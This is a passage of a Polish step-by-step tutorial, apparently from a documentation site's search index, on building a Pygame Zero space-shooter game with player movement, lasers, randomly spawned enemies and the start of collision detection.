1200\nHEIGHT = 1200\nMARGIN = 20\n\nplayer_lasers_list = []\nenemy_lasers_list = []\nenemies_list = []\n\ndef draw():\n    screen.fill(\"black\")\n    draw_lifes()\n\ndef draw_list(list):\n    pass\n\ndef draw_lifes():\n    pass\n\ndef update():\n    update_player()\n    update_player_lasers()\n    update_enemies()\n    update_enemy_lasers()\n    update_collisions()\n\ndef update_player():\n    pass\n\ndef update_player_lasers():\n    pass\n\ndef update_enemies():\n    pass\n\ndef update_enemy_lasers():\n    pass\n\ndef update_collisions():\n    pass\n\ndef on_key_down(key):\n    pass\n\ndef add_enemy():\n    pass\n\ndef choose_position():\n    pass\n\ndef add_time():\n    pass\n\npgzrun.go()\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/cosmos/#gracz","title":"Gracz","text":"<p>Naszym graczem b\u0119dzie statek kosmiczny, podobnie jak w poprzedniej grze Asteroidy. Tym razem zapiszemy go w zmiennej player i utworzymy na podstawie grafiki player.png. Naszego nowego aktora dopisujemy zaraz pod wymiarami okna i marginesem.</p> <pre><code>player = Actor(\"player\")\n</code></pre> <p>Pocz\u0105tkowo umie\u015bcimy gracza na \u015brodku ekranu.</p> <pre><code>...\nplayer.x = WIDTH / 2\nplayer.y = HEIGHT / 2\n</code></pre> <p>Teraz mo\u017cemy narysowa\u0107 naszego gracza na ekranie. Instrukcj\u0119 rysuj\u0105c\u0105 dopiszemy w funkcji draw zaraz pod wype\u0142nieniem ekranu kolorem t\u0142a, a przed wywo\u0142aniem funkcji rysuj\u0105cej \u017cycia, tak by by\u0142y one zawsze widoczne.</p> <pre><code>def draw():\n    ...\n    player.draw()\n    ...\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/cosmos/#poruszamy-statkiem","title":"Poruszamy statkiem","text":"<p>Przejd\u017amy teraz do ruchu gracza. B\u0119dziemy go przemieszcza\u0107 zgodnie z jego kierunkiem obrotu proporcjonalnie do pr\u0119dko\u015bci. Na pocz\u0105tku dopiszmy pr\u0119dko\u015b\u0107 (v) do naszego gracza, z pocz\u0105tkow\u0105 warto\u015bci\u0105 \\(2\\), zaraz pod jego wsp\u00f3\u0142rz\u0119dnymi.</p> <pre><code>player.v = 2\n</code></pre> <p>Ruch gracza zrealizujemy wewn\u0105trz naszej funkcji update_player, dlatego usuwamy z niej instrukcj\u0119 pass.</p> <pre><code>def update_player():\n</code></pre> <p>Do obliczenia ruchu gracza wykorzystamy matematyczn\u0105 formu\u0142\u0119 opart\u0105 na trygonometrii:</p> <p>$ x += \\sin(angle) * v y += \\cos(angle) * v $</p> <p>Gdzie angle to k\u0105t obrotu gracza, a v to jego pr\u0119dko\u015b\u0107. Musimy jednak dostosowa\u0107 funkcj\u0119 do naszych warunk\u00f3w. Do obliczenia sinusa i cosinusa wykorzystamy odpowiednie funkcji z biblioteki math: <code>math.sin</code> oraz <code>math.cos</code>. Funkcje te jednak przyjmuj\u0105 k\u0105t w radianach, a nie stopniach. K\u0105t obrotu gracza zapisany jest w zmiennej player.angle i podany jest w stopniach. Dlatego musimy zamieni\u0107 stopnie na radiany za pomoc\u0105 funkcji <code>math.radians</code>. Zanim to jednak zrobimy, musimy odpowiednio zmodyfikowa\u0107 ten k\u0105t, poniewa\u017c na naszej grafice statek skierowany jest do g\u00f3ry, a Pygame Zero domy\u015blnie traktuje aktor\u00f3w tak, jakby byli skierowani w prawo. Dlatego od k\u0105ta obrotu gracza odejmiemy po\u0142ow\u0119 pe\u0142nego obrotu, czyli \\(180\\).</p> <pre><code>def update_player():\n    player.x += math.sin(math.radians(player.angle - 180)) * player.v\n    player.y += math.cos(math.radians(player.angle - 180)) * player.v\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/cosmos/#obracamy-statek","title":"Obracamy statek","text":"<p>Czas zaj\u0105\u0107 si\u0119 obrotem gracza. Obraca\u0107 b\u0119dziemy go na klawisze A oraz D zgodnie z pr\u0119dko\u015bci\u0105 obrotu, kt\u00f3r\u0105 najpierw musimy do gracza dopisa\u0107. Dopisujemy wi\u0119c now\u0105 zmienn\u0105 do gracza, zaraz pod jego pr\u0119dko\u015bci\u0105. Nazwiemy j\u0105 va (a od angle) i ustawimy jej pocz\u0105tkow\u0105 warto\u015b\u0107 \\(2\\).</p> <pre><code>player.va = 2\n</code></pre> <p>Przejd\u017amy teraz do obs\u0142ugi samego obrotu. Nowe instrukcje dopiszemy na ko\u0144cu funkcji update_player. Zacznijmy od obrotu w lewo. Je\u017celi wci\u015bni\u0119ty jest klawisz A (if keyboard.A), to obracamy gracza przeciwnie do ruchu wskaz\u00f3wek zegara zgodnie z jego pr\u0119dko\u015bci\u0105 obrotu (player.va). W tym celu dodajemy pr\u0119dko\u015b\u0107 obrotu do k\u0105ta gracza (player.angle).</p> <pre><code>def update_player():\n    ...\n\n    if keyboard.A:\n        player.angle += player.va\n</code></pre> <p>Podobnie post\u0119pujemy przy obrocie zgodnie ze wskaz\u00f3wkami zegara, gdy naci\u015bni\u0119ty jest klawisz D. Tym razem odejmujemy pr\u0119dko\u015b\u0107 obrotu od k\u0105ta gracza.</p> <pre><code>def update_player():\n    ...\n\n    if keyboard.D:\n        player.angle -= player.va\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/cosmos/#przyspieszamy-statek","title":"Przyspieszamy statek","text":"<p>Nasz statek powinien mie\u0107 jakie\u015b przyspieszenie, \u017ceby gra by\u0142a ciekawsza. W tym celu dopiszemy do gracza zmienn\u0105 ac (acceleration), kt\u00f3ra b\u0119dzie oznacza\u0142a warto\u015b\u0107 przyspieszenia. Now\u0105 zmienn\u0105 dopisujemy pod pr\u0119dko\u015bci\u0105 obrotu i nadajemy jej warto\u015b\u0107 \\(0.2\\).</p> <pre><code>player.ac = 0.2\n</code></pre> <p>Dopiszemy jeszcze pr\u0119dko\u015b\u0107 maksymaln\u0105, kt\u00f3r\u0105 zapiszemy w graczu w zmiennej maxv z pocz\u0105tkow\u0105 warto\u015bci\u0105 \\(8\\).</p> <pre><code>player.ac = 0.2\nplayer.maxv = 8\n</code></pre> <p>Wracamy teraz do funkcji update_player i dopisujemy instrukcje na jej ko\u0144cu. Gdy naci\u015bni\u0119ty b\u0119dzie klawisz W, to gracz powinien przyspiesza\u0107, nie przekraczaj\u0105c jednak swojej maksymalnej pr\u0119dko\u015bci. Aby zwi\u0119kszy\u0107 pr\u0119dko\u015b\u0107 gracza (player.v) dodamy do niej jego przyspieszenie (player.ac).</p> <pre><code>def update_player():\n    ...\n\n    if keyboard.W:\n        player.v += player.ac\n</code></pre> <p>Nast\u0119pnie powinni\u015bmy sprawdzi\u0107, czy pr\u0119dko\u015b\u0107 nie przekroczy\u0142a pr\u0119dko\u015bci maksymalnej (player.maxv). Je\u017celi tak si\u0119 stanie, to powinni\u015bmy przywr\u00f3ci\u0107 pr\u0119dko\u015b\u0107 maksymaln\u0105, tzn. do pr\u0119dko\u015bci przypisa\u0107 pr\u0119dko\u015b\u0107 maksymaln\u0105.</p> <pre><code>def update_player():\n    ...\n\n    if keyboard.W:\n        player.v += player.ac\n        if player.v &gt; player.maxv:\n            player.v = player.maxv\n</code></pre> <p>Podobnie post\u0105pimy w przypadku zwalniania, gdy wci\u015bni\u0119ty jest klawisz S. Najpierw zmniejszymy pr\u0119dko\u015b\u0107 gracza odejmuj\u0105c od niej przyspieszenie.</p> <pre><code>def update_player():\n    ...\n\n    if keyboard.S:\n        player.v -= player.ac\n</code></pre> <p>Nast\u0119pnie sprawdzimy, czy pr\u0119dko\u015b\u0107 spad\u0142a poni\u017cej zera. Je\u017celi tak, to przywr\u00f3cimy pr\u0119dko\u015bci warto\u015b\u0107 zero.</p> <pre><code>def update_player():\n    ...\n\n    if keyboard.S:\n        player.v -= player.ac\n        if player.v &lt; 0:\n            player.v = 0\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/cosmos/#przechodzimy-przez-krawedzie-ekranu","title":"Przechodzimy przez kraw\u0119dzie ekranu","text":"<pre><code>def update_player():\n    ...\n\n    if player.x &gt; WIDTH + MARGIN:\n        player.x = -MARGIN\n</code></pre> <pre><code>def update_player():\n    ...\n\n    if player.x &lt; -MARGIN:\n        player.x = WIDTH + MARGIN\n</code></pre> <pre><code>def update_player():\n    ...\n\n    if player.y &lt; -MARGIN:\n        player.y = HEIGHT + MARGIN\n</code></pre> <pre><code>def update_player():\n    ...\n\n    if player.y &gt; HEIGHT + MARGIN:\n        player.y = -MARGIN\n</code></pre> <p>Pe\u0142ny fragment odpowiedzialny za przechodzenie przez kraw\u0119dzie ekranu przedstawiony jest poni\u017cej.</p> <pre><code>def update_player():\n    ...\n\n    if player.x &gt; WIDTH + MARGIN:\n        player.x = -MARGIN\n\n    if player.x &lt; -MARGIN:\n        player.x = WIDTH + MARGIN\n\n    if player.y &lt; -MARGIN:\n        player.y = HEIGHT + MARGIN\n\n    if player.y &gt; HEIGHT + MARGIN:\n        player.y = -MARGIN\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/cosmos/#peny-kod_1","title":"Pe\u0142ny kod","text":"<pre><code>import pgzrun\nimport random\nimport math\n\nWIDTH = 1200\nHEIGHT = 1200\nMARGIN = 20\n\nplayer = Actor(\"player\")\nplayer.x = WIDTH / 2\nplayer.y = HEIGHT / 2\nplayer.v = 2\nplayer.va = 2\nplayer.ac = 0.2\nplayer.maxv = 8\n\nplayer_lasers_list = []\nenemy_lasers_list = []\nenemies_list = []\n\ndef draw():\n    screen.fill(\"black\")\n    player.draw()\n    draw_lifes()\n\ndef draw_list(list):\n    pass\n\ndef draw_lifes():\n    pass\n\ndef update():\n    update_player()\n    update_player_lasers()\n    update_enemies()\n    update_enemy_lasers()\n    update_collisions()\n\ndef update_player():\n    player.x += math.sin(math.radians(player.angle - 180)) * player.v\n    player.y += math.cos(math.radians(player.angle - 180)) * player.v\n\n    if keyboard.A:\n        player.angle += player.va\n\n    if keyboard.D:\n        player.angle -= player.va\n\n    if keyboard.W:\n        player.v += player.ac\n        if player.v &gt; player.maxv:\n            player.v = player.maxv\n\n    if keyboard.S:\n        player.v -= player.ac\n        if player.v &lt; 0:\n            player.v = 0\n\n    if player.x &gt; WIDTH + MARGIN:\n        player.x = -MARGIN\n\n    if player.x &lt; -MARGIN:\n        player.x = WIDTH + MARGIN\n\n    if player.y &lt; -MARGIN:\n        player.y = HEIGHT + MARGIN\n\n    if player.y &gt; HEIGHT + MARGIN:\n        player.y = -MARGIN\n\ndef update_player_lasers():\n    pass\n\ndef update_enemies():\n    pass\n\ndef update_enemy_lasers():\n    pass\n\ndef update_collisions():\n    pass\n\ndef on_key_down(key):\n    pass\n\ndef add_enemy():\n    pass\n\ndef choose_position():\n    pass\n\ndef add_time():\n    pass\n\npgzrun.go()\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/cosmos/#strzelamy","title":"Strzelamy","text":"<p>Czas zaj\u0105\u0107 si\u0119 strzelaniem, kt\u00f3re zrealizujemy podobnie, jak w przypadku naszej poprzedniej gry Asteroidy.</p>"},{"location":"learning-by-games/python/pygame-zero/cosmos/#dodajemy-laser","title":"Dodajemy laser","text":"<p>Strza\u0142y b\u0119dziemy oddawa\u0107 po naci\u015bni\u0119ciu spacji. Dlatego zajmiemy si\u0119 teraz nasz\u0105 funkcj\u0105 on_key_down, z kt\u00f3rej usuwamy instrukcj\u0119 pass. Na pocz\u0105tku sprawdzimy, czy zosta\u0142 wci\u015bni\u0119ty klawisz spacji por\u00f3wnuj\u0105c zmienn\u0105 key z warto\u015bci\u0105 <code>keys.SPACE</code>.</p> <pre><code>def on_key_down(key):\n    if key == keys.SPACE:\n</code></pre> <p>Je\u017celi rzeczywi\u015bcie klikn\u0119li\u015bmy spacj\u0119, to czas utworzy\u0107 nowego aktora na podstawie grafiki laser1.png. Zapiszemy go w zmiennej laser.</p> <pre><code>def on_key_down(key):\n    if key == keys.SPACE:\n        laser = Actor(\"laser1\")\n</code></pre> <p>Jego pozycj\u0119 ustawimy na tak\u0105 sam\u0105, jak pozycja gracza (player.pos).</p> <pre><code>def on_key_down(key):\n    if key == keys.SPACE:\n        laser = Actor(\"laser1\")\n        laser.pos = player.pos\n</code></pre> <p>Podobnie post\u0105pimy z k\u0105tem obrotu (angle).</p> <pre><code>def on_key_down(key):\n    if key == keys.SPACE:\n        laser = Actor(\"laser1\")\n        laser.pos = player.pos\n        laser.angle = player.angle\n</code></pre> <p>Zdefiniujemy tak\u017ce pr\u0119dko\u015b\u0107 (v) i ustawimy j\u0105 na \\(10\\), tak by zawsze laser by\u0142 szybszy od statku.</p> <pre><code>def on_key_down(key):\n    if key == keys.SPACE:\n        laser = Actor(\"laser1\")\n        laser.pos = player.pos\n        laser.angle = player.angle\n        laser.v = 10\n</code></pre> <p>Nasz laser jest gotowy, dopisujemy go wi\u0119c do listy laser\u00f3w gracza za pomoc\u0105 metody append.</p> <pre><code>def on_key_down(key):\n    if key == keys.SPACE:\n        laser = Actor(\"laser1\")\n        laser.pos = player.pos\n        laser.angle = player.angle\n        laser.v = 10\n        player_lasers_list.append(laser)\n</code></pre> <p>Na ko\u0144cu warto jeszcze odtworzy\u0107 d\u017awi\u0119k laser1.</p> <pre><code>def on_key_down(key):\n    if key == keys.SPACE:\n        laser = Actor(\"laser1\")\n        laser.pos = player.pos\n        laser.angle = player.angle\n        laser.v = 10\n        player_lasers_list.append(laser)\n        sounds.laser1.play()\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/cosmos/#rysujemy-lasery","title":"Rysujemy lasery","text":"<p>Zacznijmy od uzupe\u0142nienia naszej funkcji draw_list rysuj\u0105cej wszystkie elementy listy na ekranie.</p> <pre><code>def draw_list(list):\n    for element in list:\n        element.draw()\n</code></pre> <p>Teraz pozosta\u0142o nam w cz\u0119\u015bci rysuj\u0105cej draw wywo\u0142a\u0107 nasz\u0105 funkcj\u0119\u00a0z parametrem player_lasers_list, by narysowa\u0107 wszystkie lasery gracza na ekranie. Poniewa\u017c nie chcemy, by lasery przykrywa\u0142y grafik\u0119 gracza, to narysujemy je przed graczem, czyli przed instrukcj\u0105 player.draw().</p> <pre><code>def draw():\n    ...\n    draw_list(player_lasers_list)\n    ...\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/cosmos/#poruszamy-laserami","title":"Poruszamy laserami","text":"<p>Poruszanie laserami gracza zrealizujemy w naszej pomocniczej funkcji update_player_lasers, z kt\u00f3rej usuwamy instrukcj\u0119 pass. Poniewa\u017c mamy wiele laser\u00f3w zapisanych w li\u015bcie, to zaczniemy od p\u0119tli przechodz\u0105cej przez kopi\u0119 listy laser\u00f3w (<code>player_lasers_list[:]</code>), poniewa\u017c b\u0119dziemy je usuwa\u0107 z listy, gdy wyjd\u0105 poza ekran gry.</p> <pre><code>def update_player_lasers():\n    for laser in player_lasers_list[:]:\n</code></pre> <p>Ka\u017cdy laser b\u0119dziemy przemieszcza\u0107 zgodnie z jego kierunkiem obrotu proporcjonalnie do jego pr\u0119dko\u015bci. Wykorzystamy t\u0119 sam\u0105 formu\u0142\u0119, co w przypadku ruchu gracza.</p> <pre><code>def update_player_lasers():\n    for laser in player_lasers_list[:]:\n        laser.x += math.sin(math.radians(laser.angle - 180)) * laser.v\n        laser.y += math.cos(math.radians(laser.angle - 180)) * laser.v\n</code></pre> <p>Teraz pozosta\u0142o nam sprawdzi\u0107, czy laser opu\u015bci\u0142 ju\u017c ekran gry. Por\u00f3wnujemy wi\u0119c jego wsp\u00f3\u0142rz\u0119dne z rozmiarami okna gry zmodyfikowanymi o margines.</p> <pre><code>def update_player_lasers():\n    for laser in player_lasers_list[:]:\n        laser.x += math.sin(math.radians(laser.angle - 180)) * laser.v\n        laser.y += math.cos(math.radians(laser.angle - 180)) * laser.v\n    if laser.x &gt; WIDTH + MARGIN or laser.x &lt; -MARGIN or laser.y &gt; HEIGHT + MARGIN or laser.y &lt; -MARGIN:\n</code></pre> <p>Je\u017celi laser opu\u015bci ekran gry, to usuwamy go z listy laser\u00f3w za pomoc\u0105 metody remove.</p> <pre><code>def update_player_lasers():\n    for laser in player_lasers_list[:]:\n        laser.x += math.sin(math.radians(laser.angle - 180)) * laser.v\n        laser.y += math.cos(math.radians(laser.angle - 180)) * laser.v\n\n        if laser.x &gt; WIDTH + MARGIN or laser.x &lt; -MARGIN or laser.y &gt; HEIGHT + MARGIN or laser.y &lt; -MARGIN:\n            player_lasers_list.remove(laser)\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/cosmos/#peny-kod_2","title":"Pe\u0142ny kod","text":"<pre><code>import pgzrun\nimport random\nimport math\n\nWIDTH = 1200\nHEIGHT = 1200\nMARGIN = 20\n\nplayer = Actor(\"player\")\nplayer.x = WIDTH / 2\nplayer.y = HEIGHT / 2\nplayer.v = 2\nplayer.va = 2\nplayer.ac = 0.2\nplayer.maxv = 8\n\nplayer_lasers_list = []\nenemy_lasers_list = []\nenemies_list = []\n\ndef draw():\n    screen.fill(\"black\")\n    draw_list(player_lasers_list)\n    player.draw()\n    draw_lifes()\n\ndef draw_list(list):\n    for element in list:\n        element.draw()\n\ndef draw_lifes():\n    pass\n\ndef update():\n    update_player()\n    update_player_lasers()\n    update_enemies()\n    update_enemy_lasers()\n    update_collisions()\n\ndef update_player():\n    player.x += math.sin(math.radians(player.angle - 180)) * player.v\n    player.y += math.cos(math.radians(player.angle - 180)) * player.v\n\n    if keyboard.A:\n        player.angle += player.va\n\n    if keyboard.D:\n        player.angle -= player.va\n\n    if keyboard.W:\n        player.v += player.ac\n        if player.v &gt; player.maxv:\n            player.v = player.maxv\n\n    if keyboard.S:\n        player.v -= player.ac\n        if player.v &lt; 0:\n            player.v = 0\n\n    if player.x &gt; WIDTH + MARGIN:\n        player.x = -MARGIN\n\n    if player.x &lt; -MARGIN:\n        player.x = WIDTH + MARGIN\n\n    if player.y &lt; -MARGIN:\n        player.y = HEIGHT + MARGIN\n\n    if player.y &gt; HEIGHT + MARGIN:\n        player.y = -MARGIN\n\ndef update_player_lasers():\n    for laser in player_lasers_list[:]:\n        laser.x += math.sin(math.radians(laser.angle - 180)) * laser.v\n        laser.y += math.cos(math.radians(laser.angle - 180)) * laser.v\n\n        if laser.x &gt; WIDTH + MARGIN or laser.x &lt; -MARGIN or laser.y &gt; HEIGHT + MARGIN or laser.y &lt; -MARGIN:\n            player_lasers_list.remove(laser)\n\ndef update_enemies():\n    pass\n\ndef update_enemy_lasers():\n    pass\n\ndef update_collisions():\n    pass\n\ndef on_key_down(key):\n    if key == keys.SPACE:\n        laser = Actor(\"laser1\")\n        laser.pos = player.pos\n        laser.angle = player.angle\n        laser.v = 10\n        player_lasers_list.append(laser)\n        sounds.laser1.play()\n\ndef add_enemy():\n    pass\n\ndef choose_position():\n    pass\n\ndef add_time():\n    pass\n\npgzrun.go()\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/cosmos/#przeciwnicy","title":"Przeciwnicy","text":"<p>Skoro mo\u017cemy ju\u017c strzela\u0107, to czas zaj\u0105\u0107 si\u0119 przeciwnikami.</p>"},{"location":"learning-by-games/python/pygame-zero/cosmos/#dodajemy-przeciwnikow","title":"Dodajemy przeciwnik\u00f3w","text":"<p>Zacznijmy od dodawania przeciwnik\u00f3w. W tym celu b\u0119dziemy edytowa\u0107 funkcj\u0119 update_enemies, z kt\u00f3rej usuwamy instrukcj\u0119 pass. Naszych przeciwnik\u00f3w b\u0119dziemy dodawa\u0107 w spos\u00f3b losowy. Dlatego skorzystamy z metody random.random(), kt\u00f3ra losuje liczb\u0119 rzeczywist\u0105 z przedzia\u0142u \\(&lt;0,1)\\). Je\u017celi wylosowana warto\u015b\u0107 b\u0119dzie mniejsza od jakiej\u015b ma\u0142ej liczby, np. \\(0.01\\), to dodamy nowego przeciwnika wywo\u0142uj\u0105c funkcj\u0119 add_enemy.</p> <pre><code>def update_enemies():\n    if random.random() &lt; 0.01:\n        add_enemy()\n</code></pre> <p>Oczywi\u015bcie nasza funkcja add_enemy nie zosta\u0142a jeszcze zaimplementowana, ale tym si\u0119 w\u0142a\u015bnie zajmiemy. Najpierw usuwamy z niej instrukcj\u0119 pass. Na pocz\u0105tku stworzymy nowego aktora z grafiki enemy.png, kt\u00f3rego zapiszemy w zmiennej enemy.</p> <pre><code>def add_enemy():\n    enemy = Actor(\"enemy\")\n</code></pre> <p>Teraz czas ustali\u0107 pozycj\u0119 naszego nowego przeciwnika. W tym celu do jego zmiennej pos przypiszemy warto\u015b\u0107 zwr\u00f3con\u0105 przez funkcj\u0119 choose_position (kt\u00f3r\u0105 zajmiemy si\u0119 za chwil\u0119).</p> <pre><code>def add_enemy():\n    enemy = Actor(\"enemy\")\n    enemy.pos = choose_position()\n</code></pre> <p>Pora na pr\u0119dko\u015b\u0107 (v). Mo\u017cemy j\u0105 ustali\u0107 jako losow\u0105 warto\u015b\u0107 ca\u0142kowit\u0105 (random.randint) z wybranego przedzia\u0142u, np. \\(&lt;2,5&gt;\\).</p> <pre><code>def add_enemy():\n    enemy = Actor(\"enemy\")\n    enemy.pos = choose_position()\n    enemy.v = random.randint(2, 5)\n</code></pre> <p>Na koniec dopisujemy naszego przeciwnika do listy przeciwnik\u00f3w enemies_list korzystaj\u0105c z metody append.</p> <pre><code>def add_enemy():\n    enemy = Actor(\"enemy\")\n    enemy.pos = choose_position()\n    enemy.v = random.randint(2, 5)\n    enemies_list.append(enemy)\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/cosmos/#losujemy-pozycje","title":"Losujemy pozycj\u0119","text":"<p>Zajmijmy si\u0119 teraz losowaniem startowej pozycji dla naszych przeciwnik\u00f3w, a p\u00f3\u017aniej tak\u017ce dla asteroid. W tym celu edytujemy funkcj\u0119 choose_position i usuwamy z niej instrukcj\u0119 pass. Pozycj\u0119 b\u0119dziemy losowa\u0107 w taki spos\u00f3b, aby nowy element pojawi\u0142 si\u0119 poza granicami ekranu, po lewej, prawej, u g\u00f3ry lub u do\u0142u. Zrobimy to w ten spos\u00f3b, \u017ce najpierw wylosujemy warto\u015b\u0107 ca\u0142kowit\u0105 z przedzia\u0142u \\(&lt;1,2&gt;\\). Je\u017celi wylosujemy \\(1\\), to umie\u015bcimy przeciwnika z lewej lub prawej strony. W przeciwnym przypadku umie\u015bcimy go u g\u00f3ry lub u do\u0142u. Zaczynamy od instrukcji warunkowej sprawdzaj\u0105cej, czy wylosowali\u015bmy \\(1\\).</p> <pre><code>def choose_position():\n    if random.randint(1, 2) == 1:\n</code></pre> <p>Je\u017celi tak, to wsp\u00f3\u0142rz\u0119dna \\(x\\) powinna znajdowa\u0107 si\u0119 z lewej lub prawej strony ekranu, zachowuj\u0105c przy tym odpowiedni margines. Mamy wi\u0119c do dyspozycji dwie warto\u015bci: <code>-MARGIN</code> lub <code>WIDTH + MARGIN</code>. Aby wybra\u0107 pomi\u0119dzy nimi skorzystamy z funkcji random.choice, do kt\u00f3rej jako parametr podamy te dwie warto\u015bci w postaci listy, czyli zapisane w nawiasach kwadratowych. Wynik przypiszemy do nowej zmiennej x.</p> <pre><code>def choose_position():\n    if random.randint(1, 2) == 1:\n        x = random.choice([-MARGIN, WIDTH + MARGIN])\n</code></pre> <p>Teraz czas wylosowa\u0107 drug\u0105 wsp\u00f3\u0142rz\u0119dn\u0105, y. Jej warto\u015b\u0107 powinna zawiera\u0107 si\u0119 w przedziale , tak aby element po przemieszczeniu si\u0119 na ekran w prawo lub w lewo znajdowa\u0107 si\u0119 wewn\u0105trz ekranu gry, a nie poza nim. Tworzymy wi\u0119c now\u0105 zmienn\u0105 y i przypisujemy do niej wylosowan\u0105 warto\u015b\u0107 ca\u0142kowit\u0105 z podanego przedzia\u0142u. <pre><code>def choose_position():\n    if random.randint(1, 2) == 1:\n        x = random.choice([-MARGIN, WIDTH + MARGIN])\n        y = random.randint(MARGIN, HEIGHT - MARGIN)\n</code></pre> <p>Teraz czas zaj\u0105\u0107 si\u0119 przeciwnym przypadkiem, dopisujemy wi\u0119c instrukcj\u0119 else.</p> <pre><code>def choose_position():\n    if random.randint(1, 2) == 1:\n        x = random.choice([-MARGIN, WIDTH + MARGIN])\n        y = random.randint(MARGIN, HEIGHT - MARGIN)\n    else:\n</code></pre> <p>Post\u0105pimy podobnie jak wcze\u015bniej. Tym razem jednak to wsp\u00f3\u0142rz\u0119dna y b\u0119dzie losowana z dw\u00f3ch warto\u015bci <code>-MARGIN</code> lub <code>HEIGHT + MARGIN</code>, a wsp\u00f3\u0142rz\u0119dna x z przedzia\u0142u . Zacznijmy od utworzenia zmiennej x. <pre><code>def choose_position():\n    if random.randint(1, 2) == 1:\n        x = random.choice([-MARGIN, WIDTH + MARGIN])\n        y = random.randint(MARGIN, HEIGHT - MARGIN)\n    else:\n        x = random.randint(MARGIN, WIDTH - MARGIN)\n</code></pre> <p>Teraz czas na y.</p> <pre><code>def choose_position():\n    if random.randint(1, 2) == 1:\n        x = random.choice([-MARGIN, WIDTH + MARGIN])\n        y = random.randint(MARGIN, HEIGHT - MARGIN)\n    else:\n        x = random.randint(MARGIN, WIDTH - MARGIN)\n        y = random.choice([-MARGIN, HEIGHT + MARGIN])\n</code></pre> <p>Na koniec, gdy ju\u017c wyjdziemy z instrukcji warunkowej z wylosowanymi wsp\u00f3\u0142rz\u0119dnymi, powinni\u015bmy je zwr\u00f3ci\u0107 jako wynik dzia\u0142ania naszej funkcji. W tym celu dopisujemy instrukcj\u0119 return, a po niej dwie zmienne, oddzielone przecinkiem: para wsp\u00f3\u0142rz\u0119dnych x oraz y.</p> <pre><code>def choose_position():\n    if random.randint(1, 2) == 1:\n        x = random.choice([-MARGIN, WIDTH + MARGIN])\n        y = random.randint(MARGIN, HEIGHT - MARGIN)\n    else:\n        x = random.randint(MARGIN, WIDTH - MARGIN)\n        y = random.choice([-MARGIN, HEIGHT + MARGIN])\n\n    return x, y\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/cosmos/#rysujemy-przeciwnikow","title":"Rysujemy przeciwnik\u00f3w","text":"<p>Mamy ju\u017c przeciwnik\u00f3w, pora wi\u0119c ich narysowa\u0107. W funkcji rysuj\u0105cej draw dopisujemy instrukcj\u0119 <code>draw_list(enemies_list)</code> zaraz pod narysowaniem listy laser\u00f3w gracza.</p> <pre><code>def draw():\n    ...\n    draw_list(enemies_list)\n    ...\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/cosmos/#poruszamy-przeciwnikami","title":"Poruszamy przeciwnikami","text":"<p>Nasi przeciwnicy s\u0105 jeszcze statyczni, wi\u0119c nie zobaczymy ich na ekranie, poniewa\u017c pojawiaj\u0105 si\u0119 poza nim i si\u0119 nie ruszaj\u0105. Dlatego zajmijmy si\u0119 ich ruchem. W tym celu edytujemy funkcj\u0119 update_enemies, dopisuj\u0105c nowe instrukcje na koniec. Poniewa\u017c chcemy porusza\u0107 wszystkimi przeciwnikami, to zaczniemy od p\u0119tli iteracyjnej przechodz\u0105cej przez draw_list(enemies_list) przeciwnika na li\u015bcie enemies_list.</p> <pre><code>def update_enemies():\n    ...\n\n    for enemy in enemies_list:\n</code></pre> <p>Przeciwnicy b\u0119d\u0105 si\u0119 porusza\u0107 w kierunku gracza. W tym celu musimy ich najpierw odwr\u00f3ci\u0107 we w\u0142a\u015bciw\u0105 stron\u0119. Z pomoc\u0105 przyjdzie nam metoda enemy.angle_to do kt\u00f3rej jako parametr podamy pozycj\u0119 gracza (player.pos), a wynik przypiszemy do zmiennej angle przeciwnika.</p> <pre><code>def update_enemies():\n    ...\n\n    for enemy in enemies_list:\n        enemy.angle = enemy.angle_to(player.pos)\n</code></pre> <p>Ze wzgl\u0119du na grafik\u0119 przeciwnik\u00f3w od k\u0105ta musimy jeszcze odj\u0105\u0107 \\(90\\) stopni, by rzeczywi\u015bcie byli skierowani we w\u0142a\u015bciw\u0105 stron\u0119.</p> <pre><code>def update_enemies():\n    ...\n\n    for enemy in enemies_list:\n        enemy.angle = enemy.angle_to(player.pos) - 90\n</code></pre> <p>Teraz czas ich poruszy\u0107 zgodnie z ich k\u0105tem obrotu proporcjonalnie do pr\u0119dko\u015bci. Korzystamy z tego samego wzoru co przy ruchu gracza i jego laser\u00f3w.</p> <pre><code>def update_enemies():\n    ...\n\n    for enemy in enemies_list:\n        enemy.angle = enemy.angle_to(player.pos) - 90\n        enemy.x += math.sin(math.radians(enemy.angle - 180)) * enemy.v\n        enemy.y += math.cos(math.radians(enemy.angle - 180)) * enemy.v\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/cosmos/#sprawdzamy-trafienia-w-przeciwnikow","title":"Sprawdzamy trafienia w przeciwnik\u00f3w","text":"<p>Zajmijmy si\u0119 teraz kwesti\u0105 zestrzelenia przeciwnika. Aby sprawdzi\u0107, czy trafili\u015bmy w przeciwnika, musimy sprawdzi\u0107, czy laser i przeciwnik s\u0105 w kolizji. Mamy jednak wiele laser\u00f3w i wielu przeciwnik\u00f3w, jak wi\u0119c si\u0119 do tego zabra\u0107? Idea jest prosta: b\u0119dziemy sprawdza\u0107 ka\u017cd\u0105 par\u0119 laser-przeciwnik. W ten spos\u00f3b, je\u017celi kt\u00f3rykolwiek laser trafi\u0142 w kt\u00f3regokolwiek przeciwnika, to b\u0119dziemy w stanie to wykry\u0107.</p> <p>Naszymi kolizjami zajmiemy si\u0119 wewn\u0105trz funkcji update_collisions, z kt\u00f3rej usuwamy instrukcj\u0119 pass. Na pocz\u0105tku przejdziemy przez wszystkie lasery na kopii listy laser\u00f3w. Potrzebujemy kopii listy, poniewa\u017c b\u0119dziemy usuwa\u0107 lasery po trafieniu.</p> <pre><code>def update_collisions():\n    for laser in player_lasers_list[:]:\n</code></pre> <p>Teraz czas przej\u015b\u0107 przez wszystkich przeciwnik\u00f3w na kopii listy przeciwnik\u00f3w, 